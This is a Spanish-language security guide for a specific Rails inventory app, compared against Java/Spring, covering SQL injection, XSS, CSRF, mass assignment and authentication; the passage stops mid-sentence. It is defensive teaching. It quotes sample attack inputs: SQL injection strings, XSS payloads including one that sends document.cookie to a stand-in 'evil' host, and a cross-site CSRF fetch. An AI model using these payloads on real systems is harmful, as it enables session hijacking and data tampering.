# Seguridad de una app Rails

Qué vas a encontrar acá: los diez o doce vectores de ataque que realmente aparecen
en una app Rails de negocio, con el ejemplo concreto de **este** repositorio, el
ataque que cada uno habilita y el arreglo. Comparado siempre contra el equivalente
Java/Spring, y con énfasis en **dónde se rompe la analogía**, que es donde un javero
que aterriza en Rails mete el bug.

Todos los números, salidas de comandos y hallazgos de Brakeman de este documento
salieron de correr las herramientas contra este repo, no de la memoria.

Documentos hermanos que este da por leídos: `docs/06-concurrencia-transacciones-y-locking.md`
(locking), `docs/08-rate-limiting.md` (las dos capas de rate limiting),
`docs/10-errores-comunes.md` (query cache, Zeitwerk) y
`docs/11-api-rest-serializacion-e-idempotencia.md` (idempotencia y contrato de errores).

---

## 0. El modelo mental: dónde vive la seguridad en Rails

En Spring, la seguridad es una **capa explícita y separada**: agregás
`spring-boot-starter-security`, escribís un `SecurityFilterChain`, declarás
`@PreAuthorize` en los servicios y hay un `AuthenticationManager` que orquesta
todo. Si no configurás nada, Spring Security te bloquea todo por defecto y te
imprime una contraseña random en el log.

En Rails **no existe esa capa**. La seguridad está repartida en cinco lugares
distintos y algunos vienen prendidos y otros no:

| Preocupación | Spring | Rails | ¿Viene activo? |
|---|---|---|---|
| Escapado de salida | Thymeleaf `th:text` escapa; `th:utext` no | ERB `<%= %>` escapa; `<%== %>` y `html_safe` no | ✅ sí |
| CSRF | `CsrfFilter` (activo por defecto) | `ActionController::Base` (activo), `ActionController::API` (no aplica) | ✅ sí |
| Mass assignment | DTOs + `@JsonIgnore` / binder allow-list | Strong Parameters (`permit`) | ✅ explota si no permitís |
| SQL injection | JPQL con parámetros nombrados / `PreparedStatement` | AR bindea todo salvo strings crudos | ⚠️ parcial |
| Autenticación | `AuthenticationProvider` + filtros | `has_secure_password` + código tuyo | ❌ lo escribís vos |
| Autorización | `@PreAuthorize`, `AccessDecisionManager` | Pundit / CanCanCan (gemas de terceros) | ❌ gema + disciplina |
| Cabeceras HTTP | `HttpSecurity.headers()` | `ActionDispatch::Response.default_headers` | ⚠️ parcial |

**El error #1 del javero:** asumir que hay un equivalente de
`@PreAuthorize("hasRole('ADMIN')")` que el framework aplica solo. No lo hay.
En Rails, si te olvidás de llamar a `authorize`, la acción se ejecuta y nadie
te avisa. Por eso este repo pone una red de seguridad explícita
(`after_action :verify_pundit_usage`, `app/controllers/api/v1/base_controller.rb:117`)
que en dev/test **explota** si te olvidaste. Volvemos a eso en §7.

**El error #2:** creer que porque ActiveRecord "genera el SQL", no hay
inyección posible. AR bindea los parámetros de `where(hash)`, pero deja pasar
cualquier string que le des. Y a diferencia de JPA, donde una JPQL mal armada
te falla al parsear, en Rails la interpolación de strings es idiomática y
compila perfecto.

---

## 1. SQL injection: dónde SIGUE siendo posible

ActiveRecord bindea casi todo. La forma hash y la forma con placeholders generan
`PreparedStatement` reales:

```ruby
Product.where(sku: params[:sku])                      # bindeado: $1
Product.where("sku = ?", params[:sku])                # bindeado: $1
Product.where("sku = :s", s: params[:sku])            # bindeado: $1
```

Los que **no** bindea, y son los que hay que auditar:

```ruby
# ❌ INTERPOLACIÓN DIRECTA en el string del WHERE
Product.where("sku = '#{params[:sku]}'")

# ❌ ORDER / GROUP / HAVING / SELECT con string del usuario
Product.order(params[:sort])
Product.group(params[:group_by])
Product.select(params[:fields])

# ❌ pluck / order con Arel.sql y contenido del usuario
Product.pluck(Arel.sql(params[:col]))

# ❌ find_by_sql / execute con interpolación
Product.find_by_sql("SELECT * FROM products WHERE sku = '#{params[:sku]}'")
ActiveRecord::Base.connection.execute("DELETE FROM x WHERE id = #{params[:id]}")

# ❌ lock / from / joins con string crudo
Product.lock(params[:lock_mode])
```

### 1.1 El caso `order`: por qué Rails te obliga a firmar

Desde Rails 6, `order` y `pluck` con un string arbitrario levantan
`ActiveRecord::UnknownAttributeReference`. Para pasar SQL crudo tenés que
envolverlo en `Arel.sql`. Eso **no sanitiza nada**: es literalmente una
declaración de responsabilidad, el equivalente a un `@SuppressWarnings("sql")`.
Rails te dice "sé que esto es SQL crudo, me hago cargo de que sea seguro".

Este repo usa `Arel.sql` en varios lados, y **en todos** el contenido es una
constante escrita por nosotros, nunca input:

- `app/queries/stock_items/availability.rb:39-41` — `SUM(quantity_on_hand)` y compañía
- `app/queries/stock_items/low_stock.rb:35` — `order(Arel.sql("(quantity_available - reorder_point) ASC"))`
- `app/queries/stock_items/valuation.rb:36-39` — `SUM(... ::numeric * ...)`
- `app/queries/stock_items/reconciliation.rb:32-34`
- `app/controllers/warehouses_controller.rb:12-14` — `COUNT(*) FILTER (WHERE ...)`

La regla operativa: **`Arel.sql` sólo puede recibir literales del código fuente.**
Si en un code review ves `Arel.sql` con una interpolación adentro, es un bug
hasta que se demuestre lo contrario.

La forma segura de un `order` dinámico es un **mapa de allow-list**, que es
exactamente lo que hace `app/queries/products/search.rb:25-39`:

```ruby
SORTS = {
  "name"   => { name: :asc, id: :asc },
  "sku"    => { sku: :asc, id: :asc },
  "newest" => { created_at: :desc, id: :desc },
  "price"  => { price_cents: :desc, id: :asc }
}.freeze

# ...
@sort = SORTS.key?(sort.to_s) ? sort.to_s : "name"
# ...
relation.includes(:category).order(SORTS.fetch(@sort))
```

`?sort=name;DROP TABLE products--` no matchea ninguna clave y cae al default.
El valor que llega a `order` es un Hash de símbolos, no un string. **No hay
superficie de inyección: el input del usuario nunca toca el SQL, sólo elige
entre cuatro cláusulas escritas a mano.**

### 1.2 `sanitize_sql_array`: cuando de verdad necesitás SQL crudo

Hay consultas que ActiveRecord no expresa: CTEs recursivas, `INSERT ... ON
CONFLICT ... RETURNING`. Ahí se escribe SQL a mano, y `sanitize_sql_array` es
el equivalente de un `PreparedStatement` armado a mano.

`app/models/category.rb:43-51`:

```ruby
def subtree_recursive
  sql = self.class.sanitize_sql_array([ <<~SQL.squish, id ])
    WITH RECURSIVE tree AS (
      SELECT categories.* FROM categories WHERE categories.id = ?
      UNION ALL
      SELECT c.* FROM categories c INNER JOIN tree t ON c.parent_id = t.id
    )
    SELECT * FROM tree
  SQL
  self.class.find_by_sql(sql)
end
```

Y `app/models/sequence_counter.rb:17` para el UPSERT del contador de secuencias.

Ojo con el detalle: `sanitize_sql_array` **no** genera un prepared statement.
Escapa el valor y lo pega en el string. Lo verifiqué:

```ruby
Product.sanitize_sql_array(["name = ?", "OMalley's; DROP TABLE products--"])
# => name = 'OMalley''s; DROP TABLE products--'
```

Escapa la comilla duplicándola, que es lo correcto para Postgres. Es seguro,
pero es **escaping**, no **binding**. La diferencia importa: no te sirve para
identificadores (nombres de tabla/columna) ni para cláusulas estructurales.
Para eso está `connection.quote_table_name` / `quote_column_name`, y aun así
la respuesta correcta casi siempre es una allow-list.

**Dónde se rompe la analogía con Java:** en JPA, un `entityManager.createQuery(
"FROM Product WHERE sku = '" + sku + "'")` es igual de vulnerable, pero es
código feo y evidente. En Rails, `where("sku = '#{sku}'")` se ve **idiomático**
porque `where` con string es la forma normal de escribir condiciones que el DSL
no cubre. La trampa es estética, no técnica.

### 1.3 `sanitize_sql_like`: el DoS que casi nadie ve

Esto no es inyección de SQL: es inyección de **comodines**. En un
`ILIKE '%term%'`, si el usuario manda `%` o `_`, cambia la semántica de la
búsqueda. Un solo `%` fuerza un scan completo. Repetidos (`%a%b%c%d%e%`)
disparan un backtracking en el matcher de patrones de Postgres.

`app/models/supplier.rb:23`:

```ruby
scope :search, ->(term) {
  return all if term.blank?
  where("name ILIKE :q OR tax_id ILIKE :q", q: "%#{sanitize_sql_like(term)}%")
}
```

Y `app/queries/products/search.rb:59`:

```ruby
pattern = "%#{Product.sanitize_sql_like(@term.strip)}%"
```

Comprobado en consola: `Product.sanitize_sql_like("100%_off")` devuelve
`100\%\_off`. Escapa `%`, `_` y `\`.

**Regla:** todo valor de usuario que termine adentro de un `LIKE`/`ILIKE` pasa
por `sanitize_sql_like`, **además** de estar bindeado. Son dos problemas
distintos y hacen falta las dos defensas.

---

## 2. XSS

### 2.1 El escapado automático de ERB

ERB escapa por defecto. Lo verifiqué:

```ruby
ERB::Util.html_escape("<script>alert(1)</script>")
# => "&lt;script&gt;alert(1)&lt;/script&gt;"
# clase:      ActiveSupport::SafeBuffer
# html_safe?: true
```

El mecanismo es `ActiveSupport::SafeBuffer`, una subclase de `String` con un
flag. `<%= x %>` llama a `html_escape(x)`, que:

- si `x.html_safe?` → lo deja tal cual
- si no → lo escapa

Y `SafeBuffer#+` escapa el operando inseguro al concatenar:

```ruby
"<b>".html_safe + "<script>alert(1)</script>"
# => "<b>&lt;script&gt;alert(1)&lt;/script&gt;"
```

**Comparación con Java:** es el mismo contrato que Thymeleaf (`th:text` escapa,
`th:utext` no) o JSP con `<c:out>`. La diferencia grande: en Rails el flag viaja
**pegado al objeto String**, no lo decide la plantilla. Un método de un helper
puede devolver un `SafeBuffer` y ese string entra sin escapar a **cualquier**
`<%= %>` de la app, sin que la vista lo sepa. Eso convierte a `html_safe` en un
efecto contagioso y hace que la auditoría tenga que ser sobre el código Ruby,
no sobre las plantillas.

### 2.2 Los tres agujeros: `html_safe`, `raw` y `<%==`

```erb
<%= raw user_input %>          <!-- ❌ sin escapar -->
<%= user_input.html_safe %>    <!-- ❌ sin escapar -->
<%== user_input %>             <!-- ❌ sin escapar (azúcar de raw) -->
```

`<%==` es la sintaxis de **doble igual** de Erubi: significa exactamente
`<%= raw(...) %>`. Es la más peligrosa de las tres porque **se parece a `<%=`**
y en un diff se pierde.

En este repo hay exactamente cinco `<%==`, y todos son la misma línea:

```text
app/views/products/index.html.erb:51
app/views/stock_items/index.html.erb:43
app/views/stock_transfers/index.html.erb:27
app/views/suppliers/index.html.erb:29
app/views/warehouses/show.html.erb:25
```

```erb
<div class="mt-4"><%== pagy_nav(@pagy) %></div>
```

`pagy_nav` devuelve un `String` común (no un `SafeBuffer`) con el HTML de la
navegación —lo confirmé en consola: `html.class # => String`,
`html.html_safe? # => false`—, así que con `<%=` verías las etiquetas escapadas
en pantalla. `<%==` es acá una declaración de "confío en esta gema".

¿Está bien confiar? Fui a mirar. `pagy_nav` arma las URLs con
`Pagy::UrlHelpers#pagy_url_for` (`pagy-9.4.0/lib/pagy/url_helpers.rb:9`), que
termina en `Rack::Utils.build_nested_query(query_params)` (misma clase, línea
15). Ese método percent-encodea los valores:

```ruby
Rack::Utils.build_nested_query({"q" => %q{"><script>alert(1)</script>}, "page" => 2})
# => q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page=2
```

O sea: `?q="><script>alert(1)</script>` **no** rompe el `href`. El `<%==` es
seguro *hoy*, con esta versión de pagy. Pero es una confianza que no está
verificada por nada: si mañana escribís tu propio `nav` interpolando
`params[:q]`, tenés XSS reflejado y ningún test lo va a notar.

**Cómo se ve el ataque si esto se rompiera:** el usuario A manda un link a
`/products?q="><script>fetch('//evil/'+document.cookie)</script>`. Como las
cookies de sesión son `httponly` (§6), no roba la cookie — pero sí puede hacer
requests autenticadas en nombre de la víctima (crear productos, disparar
ajustes de stock) porque el JS corre con la sesión de ella.

### 2.3 Interpolar en atributos: el vector que el escapado no cubre

El escapado de ERB protege el **contenido de texto**. No te salva de esto:

```erb
<!-- ❌ el atributo se puede romper aunque escape comillas -->
<a href="<%= params[:next] %>">seguir</a>       <!-- javascript:alert(1) -->
<div onclick="<%= params[:x] %>">              <!-- ya estás dentro de JS -->
<script>var q = "<%= params[:q] %>";</script>  <!-- </script> escapa del contexto -->
```

`html_escape` escapa `<`, `>`, `&`, `"`, `'`. Alcanza para el atributo entre
comillas, pero **no** para el esquema de un `href` (`javascript:`) ni para un
contexto JS. Para eso están `sanitize` (allow-list de tags), `link_to` (que
valida el esquema) y `json_escape` / `to_json` dentro de `<script>`.

Este repo no tiene ni un `onclick=` ni un `href` interpolado: todos los links
salen de helpers de rutas (`product_path(product.sku)`,
`app/views/products/index.html.erb:35`). Eso no es suerte, es una decisión:
**si todas las URLs salen del router, no hay open redirect ni `javascript:`**.

### 2.4 Content Security Policy y el nonce

**Estado real de este repo: CSP está DESACTIVADA.**

`config/initializers/content_security_policy.rb` está entero comentado (es el
archivo que genera `rails new`, sin tocar). Lo confirmé en runtime:

```ruby
Rails.application.config.content_security_policy   # => nil
```

Y sin embargo `app/views/layouts/application.html.erb:7` tiene
`<%= csp_meta_tag %>`. Ese helper emite el `<meta name="csp-nonce">` que Turbo
usa para inyectar scripts; con la política en `nil` no rompe nada, pero
**tampoco protege nada**. Es exactamente el estado en el que están el 80% de
las apps Rails en producción: el helper puesto, la política vacía.

El arreglo, y por qué el nonce importa:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :self
    policy.font_src    :self, :data
    policy.img_src     :self, :data
    policy.object_src  :none
    policy.script_src  :self
    policy.style_src   :self
    policy.base_uri    :self
    policy.frame_ancestors :none
    policy.report_uri "/csp-violation-report-endpoint"
  end

  # Un nonce nuevo por respuesta. `SecureRandom.base64(16)` es lo correcto;
  # NO uses request.session.id (el ejemplo comentado que genera Rails):
  # es estable durante toda la sesión, así que un atacante que lo lea una vez
  # puede firmar scripts para siempre. El nonce tiene que ser IMPREDECIBLE
  # y de un solo uso.
  config.content_security_policy_nonce_generator = ->(_request) { SecureRandom.base64(16) }
  config.content_security_policy_nonce_directives = %w[script-src style-src]

  # Sin esta línea, `javascript_tag` / `javascript_include_tag` / `stylesheet_link_tag`
  # NO ponen el nonce solos: el default de `content_security_policy_nonce_auto`
  # es `false` (railties `configuration.rb:76`), y el initializer que genera
  # Rails lo deja comentado.
  config.content_security_policy_nonce_auto = true
end
```

Con eso, cualquier `<script>` inyectado por XSS **no se ejecuta** porque no lleva
el nonce. CSP es la defensa en profundidad: no evita el XSS, evita que sirva de algo.

Una precisión sobre quién pone el nonce, porque acá se pierde mucha gente:
`javascript_importmap_tags` lo pasa **siempre** de forma explícita
(`importmap-rails`, `importmap_tags_helper.rb:15` y `:21`, con
`nonce: request&.content_security_policy_nonce`), así que funciona sin tocar
nada más. `javascript_tag` y compañía dependen de
`content_security_policy_nonce_auto`, que viene en `false`. Si activás CSP y te
olvidás de esa línea, tus scripts inline se caen y los del importmap no.

Arrancá siempre con `config.content_security_policy_report_only = true`,
mirá el reporte una semana y recién ahí lo hacés bloqueante. Activar CSP a
ciegas rompe el sitio, garantizado.

**Comparación:** en Spring esto es `HttpSecurity.headers().contentSecurityPolicy(...)`.
Mismo header, mismo problema de adopción.

---

## 3. CSRF

### 3.1 El mecanismo

Rails inyecta un token en cada formulario (`form_with` lo hace solo) y lo
verifica en toda petición que no sea GET/HEAD. El token es
`SecureRandom` enmascarado con XOR por request (para mitigar BREACH), y se
compara contra el guardado en la sesión.

`app/controllers/application_controller.rb` hereda de `ActionController::Base`,
que trae `protect_from_forgery with: :exception` **activo por defecto** desde
Rails 5.2 (`config.load_defaults` ≥ 5.2). No hay que escribirlo.
`app/views/layouts/application.html.erb:6` emite `csrf_meta_tags`, que es lo que
Turbo/Rails-UJS leen para adjuntar el token en requests AJAX.

### 3.2 Cuándo desactivarlo — y cuándo NO

El ataque CSRF explota **una sola cosa**: que el browser adjunta la cookie de
sesión automáticamente, aunque la request la origine otro sitio.

De ahí sale la regla:

| Autenticación | ¿CSRF posible? | ¿Token necesario? |
|---|---|---|
| Cookie de sesión | ✅ sí | ✅ sí |
| Header `Authorization: Bearer` | ❌ no (el browser no lo manda solo) | ❌ no |
| Basic auth | ✅ sí (el browser sí lo cachea y reenvía) | ✅ sí |

Este repo aplica exactamente eso:

- **UI web** (`ApplicationController` → `ActionController::Base`): CSRF activo,
  cookie firmada (`app/controllers/concerns/authentication.rb:44`).
- **API** (`app/controllers/api/v1/base_controller.rb` → `ActionController::API`):
  no hay CSRF **porque no se carga el módulo**. `ActionController::API` no
  incluye `RequestForgeryProtection`, ni cookies, ni flash, ni vistas. No es que
  "lo desactivamos": es un stack distinto, más chico, con menos superficie.
  El razonamiento está documentado en
  `app/controllers/concerns/api/token_authentication.rb:11-16`.

**El anti-patrón que ves en producción:** alguien pone `skip_forgery_protection`
en un controller **con sesión de cookie** porque "el fetch de JavaScript da 422".
Eso es un agujero real: cualquier página puede hacer
`fetch('https://tuapp/stock_items/1/adjust', {method:'POST', credentials:'include'})`
y ajustar tu inventario. El arreglo correcto es mandar el token, no sacarlo:

```javascript
fetch(url, {
  method: "POST",
  headers: {
    "X-CSRF-Token": document.querySelector('meta[name="csrf-token"]').content,
    "Content-Type": "application/json"
  },
  body: JSON.stringify(payload)
})
```

### 3.3 SameSite: la segunda capa

`app/controllers/concerns/authentication.rb:44`:

```ruby
cookies.signed.permanent[:session_id] = {
  value: session.id, httponly: true, same_site: :lax
}
```

`same_site: :lax` le dice al browser: **no mandes esta cookie en requests
cross-site**, salvo navegación top-level con GET. Eso mata el CSRF por POST de
formulario cruzado a nivel browser, antes de que la request llegue al servidor.

Los tres valores:

| Valor | Se manda cross-site en | Rompe |
|---|---|---|
| `:strict` | nunca | login vía link externo, OAuth callbacks |
| `:lax` | GET top-level (clic en un link) | poco; es el default sensato |
| `:none` | siempre (exige `secure: true`) | nada, pero volvés a ser vulnerable |

La cookie de sesión de Rails (`_stock_session`, la del `CookieStore`) usa
`DEFAULT_SAME_SITE = proc { |request| request.cookies_same_site_protection }`,
que con `load_defaults 8.1` resuelve a `:lax`. O sea: las dos cookies del sistema
están en `:lax`.

**Importante y contraintuitivo:** SameSite **no reemplaza** el token CSRF.
Un subdominio comprometido (`blog.tuempresa.com`) es *same-site* para
`app.tuempresa.com`, así que la cookie sí viaja. Y los browsers viejos ignoran
el atributo. Son dos capas independientes; se usan las dos.

---

## 4. Mass assignment

El agujero clásico: `Product.new(params[:product])` con todo lo que venga.
Rails aprendió esto por las malas — en 2012 alguien se dio permisos de commit en
el repo de Rails **en GitHub** explotando exactamente esto.

Strong Parameters es una **allow-list explícita**. Lo que no está, no pasa:

```ruby
# app/controllers/products_controller.rb:73
def product_params
  params.require(:product).permit(:sku, :name, :description, :barcode, :category_id,
                                  :unit, :cost_cents, :price_cents, :currency,
                                  :active, :lock_version)
end

# app/controllers/warehouses_controller.rb:54
def warehouse_params = params.require(:warehouse).permit(:code, :name, :address, :timezone, :active)
```

`params.require(:product)` levanta `ActionController::ParameterMissing` si falta
la clave raíz — que la API traduce a 400 en
`app/controllers/concerns/api/error_handling.rb:97`. Y `permit` devuelve un
`ActionController::Parameters` con `permitted? == true`; sin eso,
`Model.new(params)` levanta `ForbiddenAttributesError`.

**El caso interesante de este repo:** `User` **no tiene** un `user_params` en
ningún controller, porque no hay CRUD de usuarios en la UI. Si mañana lo agregás,
el bug garantizado es este:

```ruby
# ❌ ESCALADA DE PRIVILEGIOS
def user_params = params.require(:user).permit(:name, :email_address, :role)
```

Un `operator` edita su propio perfil, manda `user[role]=admin`, y se
autopromueve. El `enum :role` (`app/models/user.rb`) valida que sea uno de los
cuatro roles conocidos — pero `admin` **es** uno de los cuatro. La validación no
te salva; el problema no es el valor, es **quién** lo puede escribir.

El arreglo correcto es que la allow-list dependa del que pide:

```ruby
def user_params
  permitted = %i[name email_address password password_confirmation]
  permitted << :role if policy(@user).change_role?
  params.require(:user).permit(*permitted)
end
```

Y la regla vive en la policy, no en el controller —
`app/policies/user_policy.rb:12`:

```ruby
def change_role? = admin? && record != user     # nadie se promueve a sí mismo
```

**Comparación con Java:** esto en Spring lo resolvés con un DTO por caso de uso
(`UserUpdateRequest` sin campo `role`) o con `@JsonIgnore`. La diferencia es que
en Java el compilador te obliga a tener un tipo, y un campo que no existe en el
DTO **no puede** setearse. En Rails el "DTO" es un hash dinámico y la allow-list
es una lista de símbolos que nadie chequea contra el modelo: si escribís
`:catgory_id` con un typo, `permit` lo acepta en silencio, el atributo se
descarta y el bug es una asignación que nunca ocurre. `config.action_controller.
action_on_unpermitted_parameters = :raise` (en dev/test) es el mínimo para
enterarte.

---

## 5. Autenticación

### 5.1 bcrypt y su cost

`app/models/user.rb` usa `has_secure_password`. Guarda un hash bcrypt en
`users.password_digest` (`db/schema.rb:336`, `string NOT NULL`).

Medido en este repo:

```text
BCrypt::Engine.cost                    = 12
ActiveModel::SecurePassword.min_cost   = false
digest de admin@stock.test             = $2a$12$...
cost real leído del digest             = 12
```

El **cost** es el factor de trabajo logarítmico: `2^cost` iteraciones. Subir de
11 a 12 duplica el tiempo. En esta máquina, cost 12 son ~235 ms por verificación.

Lo importante que hay que entender: **el cost está embebido en el digest**
(`$2a$12$...`). Si mañana subís `BCrypt::Engine.cost = 13`, los digests viejos
siguen verificando con 12 y sólo los nuevos usan 13. Para rehashear en masa
necesitás el password en claro, así que se hace **en el login**:

```ruby
if user = User.authenticate_by(params.permit(:email_address, :password))
  if BCrypt::Password.new(user.password_digest).cost < BCrypt::Engine.cost
    user.update!(password: params[:password])   # rehash con el cost nuevo
  end
  start_new_session_for user
end
```

En test, `ActiveModel::SecurePassword.min_cost` vale `true` y el cost baja a
`BCrypt::Engine::MIN_COST` (4). **Eso no lo configura este repo ni el
`rails_helper`**: lo hace el railtie de ActiveModel, que ejecuta
`ActiveModel::SecurePassword.min_cost = Rails.env.test?`
(`activemodel-8.1.3.1/lib/active_model/railtie.rb:18`). Lo verifiqué en las dos
puntas: `grep -r min_cost spec/` no devuelve nada, y `RAILS_ENV=test bin/rails
runner` imprime `true` igual. Sin ese ajuste, una suite con 200 `create(:user)`
se iría varios minutos sólo hasheando.

**Dónde se rompe la analogía con Java:** Spring Security usa
`BCryptPasswordEncoder` con **strength 10 por defecto** y tiene
`DelegatingPasswordEncoder`, que prefija el digest con `{bcrypt}` / `{argon2}`
y permite migrar de algoritmo transparentemente. En Rails no hay nada de eso:
`has_secure_password` es bcrypt y punto. Si querés Argon2 tenés que escribir el
setter y el `authenticate` a mano. En una entrevista, saber que **Argon2id es lo
que recomienda OWASP hoy** y que bcrypt sigue siendo aceptable (con cost ≥ 12)
es la respuesta completa.

Detalle que se pregunta: bcrypt **trunca a 72 bytes**. `has_secure_password`
valida eso explícitamente (`MAX_PASSWORD_LENGTH_ALLOWED = 72` en
`activemodel-8.1.3.1/lib/active_model/secure_password.rb:12`). Con multibyte, 72 *bytes*
son ~24 caracteres en español con tildes. Y sí: pre-hashear con SHA-256 para
sortear el límite es un anti-patrón conocido (habilita password shucking).

### 5.2 `authenticate_by` y la enumeración de usuarios por timing

Este es **el** punto que hay que saber explicar bien.

La versión ingenua, la que sale sola:

```ruby
# ❌ VULNERABLE A ENUMERACIÓN POR TIMING
user = User.find_by(email_address: params[:email_address])
if user&.authenticate(params[:password])
```

Si el email **no existe**, `find_by` devuelve `nil`, el `&.` corta y respondés
en milisegundos. Si el email **sí existe**, corrés bcrypt y tardás cientos de ms.
El atacante no necesita adivinar la contraseña: mide el tiempo de respuesta y
**enumera qué emails están registrados**. Eso es información valiosa por sí sola
(saber que `ceo@competencia.com` tiene cuenta) y es el paso 1 de un credential
stuffing dirigido.

Lo medí en este repo con `bin/rails runner`: diez iteraciones de cada caso tras
warmup, promedio por llamada, y la corrida repetida cuatro veces para descartar
ruido.

| Camino | Usuario existe | Usuario NO existe | Ratio |
|---|---|---|---|
| `find_by` + `authenticate` (ingenuo) | **233 ms** | **0,7 ms** | **~330×** |
| `User.authenticate_by` | **236 ms** | **235 ms** | **~1,01×** |

Los milisegundos absolutos dependen del hardware (son bcrypt cost 12 en esta
máquina); lo que importa es el orden de magnitud, y ése es estable: dos órdenes
de magnitud de diferencia en el camino ingenuo, 1% en el correcto. 330× es
medible **desde internet**, con jitter de red y todo. 1% no.

Por eso `app/controllers/sessions_controller.rb:17` usa:

```ruby
if user = User.authenticate_by(params.permit(:email_address, :password))
```

¿Cómo lo logra? Mirá la implementación real
(`activerecord-8.1.3.1/lib/active_record/secure_password.rb:41`):

```ruby
def authenticate_by(attributes)
  passwords, identifiers = attributes.to_h.partition { |name, value|
    !has_attribute?(name) && has_attribute?("#{name}_digest")
  }.map(&:to_h)

  raise ArgumentError, "One or more password arguments are required" if passwords.empty?
  raise ArgumentError, "One or more finder arguments are required" if identifiers.empty?
  return if passwords.any? { |name, value| value.nil? || value.empty? }

  if record = find_by(identifiers)
    record if passwords.count { |name, value| record.public_send(:"authenticate_#{name}", value) } == passwords.size
  else
    new(passwords)   # ← LA LÍNEA CLAVE
    nil
  end
end
```

`new(passwords)` instancia un `User` nuevo asignándole el password. Eso dispara
el setter `password=` de `has_secure_password`, que llama a
`BCrypt::Password.create(...)`. **Quema deliberadamente el mismo tiempo de CPU
que habría costado verificar**, y después devuelve `nil`. Es un "trabajo falso"
intencional para igualar los caminos.

Dos consecuencias que hay que decir en voz alta:

1. **No cierra el canal por completo.** Iguala el tiempo de *bcrypt*, no el de la
   query. Si el `find_by` con hit y sin hit tienen tiempos distintos (un índice
   parcial, un cache), queda un delta chico. Por eso `authenticate_by` es
   *necesario pero no suficiente*: el mensaje de error también tiene que ser
   idéntico ("Email o contraseña incorrectos", nunca "ese email no existe"), y
   el rate limiting tiene que estar (§5.3).
2. **`/passwords#create` sí filtra por otro canal.**
   `app/controllers/passwords_controller.rb:10` hace
   `User.find_by(email_address: params[:email_address])` y sólo manda mail si
   existe (`deliver_later` en la línea 11). La *respuesta*
   es idéntica en los dos casos ("instrucciones enviadas si existe una cuenta"),
   que es lo correcto. Pero el timing no está igualado: la rama que existe hace
   un `deliver_later` (encolar un job). En una app con cola en Postgres, eso son
   milisegundos extra medibles. Si te importa, encolás un job dummy en la otra
   rama, o mandás todo a un job que decide adentro.

### 5.3 Rate limiting del login

Dos capas, y cubren amenazas distintas.

**Capa de borde**, `config/initializers/rack_attack.rb`:

```ruby
throttle("logins/ip", limit: 5, period: 20.seconds) do |req|
  req.remote_ip if req.path == "/session" && req.post?
end

throttle("logins/email", limit: 6, period: 15.minutes) do |req|
  if req.path == "/session" && req.post?
    req.params.dig("session", "email_address")&.to_s&.downcase&.strip&.presence
  end
end
```

- **Por IP** frena el credential stuffing desde una máquina.
- **Por email** frena el ataque distribuido contra **una** cuenta: un botnet con
  5.000 IPs haciendo 2 requests cada una nunca toca el límite por IP.

Hacen falta **los dos**. Y fijate el `.downcase.strip`: sin normalizar, el
atacante evade el contador cambiando el casing (`Ana@x.com` vs `ana@x.com`).

**Capa de controller**, `app/controllers/sessions_controller.rb:5`:

```ruby
rate_limit to: 10, within: 3.minutes, only: :create,
           with: -> { redirect_to new_session_path, alert: "Demasiados intentos..." }
```

Sobre el `rate_limit` nativo de Rails 8 hay dos trampas graves que este repo
documenta en `app/controllers/api/v1/base_controller.rb` y en `docs/08`:

1. **Un rate limiter sobre un `NullStore` no limita nada y no avisa.**
   `rate_limit` hace `store.increment(...)`; `NullStore` devuelve `nil`, la
   comparación `count && count > to` nunca se cumple, y el límite queda
   desactivado en silencio. Es un fallo **de seguridad** silencioso.
2. **Dos `rate_limit` sin `name:` en la misma jerarquía de controllers comparten
   la clave del contador** (`["rate-limit", scope, name, by].compact.join(":")`,
   con `scope` = `controller_path` por defecto —
   `actionpack-8.1.3.1/lib/action_controller/metal/rate_limiting.rb:75`), así
   que cada request lo incrementa dos veces y el límite efectivo queda a la
   mitad: uno de 20 corta en la request 11.

Lo que **falta** acá y hay que saber pedirlo: **bloqueo de cuenta**
(N fallos → cuenta bloqueada M minutos, con desbloqueo por mail) y
**notificación de login desde IP nueva**. El rate limit frena el volumen; no
frena a un atacante paciente con 3 intentos por hora.

### 5.4 Política de contraseñas

Este repo **no tiene** validación de largo mínimo ni de complejidad. `User`
valida presencia y formato del email, largo del nombre, y nada del password
más allá del máximo de 72 bytes que impone `has_secure_password`. Los seeds
usan `ENV.fetch("SEED_ADMIN_PASSWORD", "password123")` (`db/seeds.rb:20`), o sea
que `password123` es el default cuando no inyectás la variable.

Para dev está bien. Para producción, lo que dice NIST SP 800-63B hoy:

```ruby
class User < ApplicationRecord
  has_secure_password

  # ✅ Largo mínimo generoso, SIN reglas de composición.
  # Las reglas de "una mayúscula, un número y un símbolo" producen
  # "Password1!" — peor entropía que "correcto caballo batería grapa".
  validates :password, length: { minimum: 12 }, allow_nil: true

  # ✅ Bloquear las que ya están filtradas. Esto sí mueve la aguja:
  # el ataque real es credential stuffing con listas de breaches.
  validate :password_not_pwned, if: -> { password.present? }
end
```

`allow_nil: true` es obligatorio: sin eso, cualquier `user.update(name: "x")`
falla porque `password` es `nil` en un registro cargado de la base (el digest
está, el virtual no).

Lo que NO hay que hacer: expiración forzada cada 90 días (NIST lo desaconseja
explícitamente; produce `Verano2024!` → `Verano2024!!`), y reglas de composición.

### 5.5 Tokens de reset con expiración

`app/controllers/passwords_controller.rb:31` usa
`User.find_by_password_reset_token!(params[:token])`. Ese método **no está
escrito en el modelo**: lo genera `has_secure_password` cuando el modelo
responde a `generates_token_for` (o sea, siempre en un ActiveRecord).
La definición está en `activemodel-8.1.3.1/lib/active_model/secure_password.rb:171-190`:

```ruby
if reset_token && respond_to?(:generates_token_for)
  reset_token_expires_in = ... || DEFAULT_RESET_TOKEN_EXPIRES_IN   # 15.minutes
  generates_token_for :password_reset, expires_in: reset_token_expires_in do
    password_salt&.last(10)      # ← EL PUNTO IMPORTANTE
  end
  # define find_by_password_reset_token / find_by_password_reset_token!
end
```

Tres propiedades, todas gratis:

1. **Expira solo, a los 15 minutos.** No hay columna `reset_token_expires_at`
   que puedas olvidarte de chequear: el timestamp viaja **dentro** del token,
   firmado con `secret_key_base`.
2. **Es de un solo uso, sin tabla.** El bloque devuelve
   `password_salt.last(10)` — 10 caracteres del salt de bcrypt. Ese salt cambia
   cuando cambia el password. Entonces, apenas la víctima usa el token, el
   digest cambia, el salt cambia, y el token **deja de validar solo**. Cero
   estado del lado del servidor.
3. **No es un identificador enumerable.** Es un `MessageVerifier` firmado. Lo
